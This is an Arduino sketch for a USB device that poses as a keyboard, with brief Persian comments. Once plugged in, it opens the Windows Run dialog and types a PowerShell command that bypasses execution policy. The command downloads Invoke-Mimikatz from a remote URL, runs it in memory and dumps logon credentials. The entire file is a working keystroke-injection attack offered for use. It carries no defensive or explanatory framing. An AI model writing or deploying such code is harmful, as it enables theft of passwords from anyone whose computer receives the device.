#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  // اجرای Mimikatz در مموری (بدون ذخیره روی دیسک)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  
  // دانلود و اجرای مستقیم از طریق PowerShell
  Keyboard.println(F("powershell -ep bypass -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex(iwr -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -UseBasicParsing); Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords' -Force\""));
}

void loop() {}
